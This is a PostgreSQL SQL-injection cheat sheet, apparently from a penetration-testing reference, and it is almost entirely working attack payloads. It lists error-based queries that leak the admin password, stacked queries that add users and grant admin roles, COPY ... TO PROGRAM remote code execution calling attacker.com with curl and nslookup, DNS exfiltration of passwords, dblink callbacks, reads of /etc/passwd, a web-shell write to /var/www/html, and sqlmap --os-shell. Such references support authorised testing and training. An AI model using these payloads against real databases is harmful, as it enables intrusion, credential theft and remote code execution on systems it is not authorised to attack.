# Per-DBMS Reference — PostgreSQL

## When this applies

- DBMS fingerprint indicates PostgreSQL. Quick check:
  ```sql
  ' UNION SELECT NULL--
  ' AND pg_sleep(5)--
  SELECT version()--
  ```
- PG-specific functions (`pg_sleep`, `pg_database`, `current_database`) confirm.

## Technique

PostgreSQL is the most exploit-friendly mainstream DBMS: stacked queries supported, `COPY ... TO PROGRAM` gives RCE, `dblink` enables OAST. Comment syntax is standard `--` and `/* */`. String concatenation via `||`.

## Steps

### Comment syntax

```sql
--          # Single-line
/*...*/     # Multi-line
```

### Concatenation

```sql
'foo' || 'bar'              # 'foobar'
CONCAT('foo', 'bar')        # PG ≥ 9.1
```

### Version / current user

```sql
SELECT version()
SELECT current_user
SELECT current_database()
SELECT inet_server_addr()
```

### Schema enumeration

```sql
SELECT datname FROM pg_database
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Time delay

```sql
SELECT pg_sleep(10)
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

### Error-based extraction

```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

Error: `ERROR: invalid input syntax for integer: "<value>"` — the value is leaked verbatim.

### Substring / length

```sql
SUBSTRING(s FROM p FOR l)       # SQL-standard form
SUBSTRING(s, p, l)
LENGTH(s)
```

### Stacked queries (FULLY supported)

```sql
'; INSERT INTO users VALUES ('hacker','password123')--
'; UPDATE users SET role='admin' WHERE username='attacker'--
'; CREATE TABLE pwn (data text)--
```

### Out-of-band via `COPY ... TO PROGRAM`

```sql
'; copy (SELECT '') to program 'nslookup ATTACKER_DOMAIN'--
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/`whoami`'--
```

Requires PG ≥ 9.3 and superuser (or `pg_execute_server_program` role on PG13+). This is the PostgreSQL RCE primitive.

### Out-of-band data exfiltration

```sql
'; copy (SELECT password FROM users WHERE username='administrator') to program 'nslookup $(whoami).COLLABORATOR'--
```

### `dblink` (OAST without superuser)

If `dblink` extension is installed:

```sql
SELECT * FROM dblink('host=attacker.com user=postgres password=x dbname=postgres', 'SELECT 1') AS t(data text);
```

Triggers an outbound TCP connection to attacker — DNS resolution alone leaks via Collaborator.

### File read

```sql
COPY temp_table FROM '/etc/passwd'                  -- requires SUPERUSER
SELECT pg_read_file('/etc/passwd', 0, 1000000)       -- pg_read_server_files role on PG11+
```

### File write

```sql
COPY temp_table TO '/var/www/html/shell.php'         -- requires SUPERUSER
```

### Privilege check

```sql
SELECT current_setting('is_superuser')
SELECT usesuper FROM pg_user WHERE usename = current_user
```

### Variants / aliases

```sql
||      → string concatenation (always; PG never overloads it as boolean OR)
LIKE    → ILIKE (case-insensitive variant)
~       → regex match (case-sensitive)
~*      → regex match (case-insensitive)
```

## Verifying success

- `SELECT version()` returns `PostgreSQL 13.4 on x86_64-pc-linux-gnu...` or similar.
- `pg_sleep(10)` reliably delays response.
- `COPY (SELECT '') TO PROGRAM 'curl http://collab/'` triggers Collaborator HTTP/DNS.

## Common pitfalls

- `COPY ... TO PROGRAM` requires SUPERUSER (or `pg_execute_server_program` on PG13+); regular roles fail silently with permission denied.
- `dblink` extension may not be installed by default — `CREATE EXTENSION dblink` requires SUPERUSER.
- `pg_read_file` path is relative to the data directory unless absolute; permissions also restricted.
- Stacked queries split on `;` — careful with comments containing `;`.
- Type strictness is high: `' OR 1=1` may not work in `WHERE id=...` if `id` is integer; use `' OR '1'='1` or numeric injection.

## Tools

- sqlmap `--dbms=PostgreSQL --os-shell` automates `COPY ... TO PROGRAM` exploitation.
- `psql` CLI for sandbox testing.
- pgAdmin for full schema inspection if you have credentials.
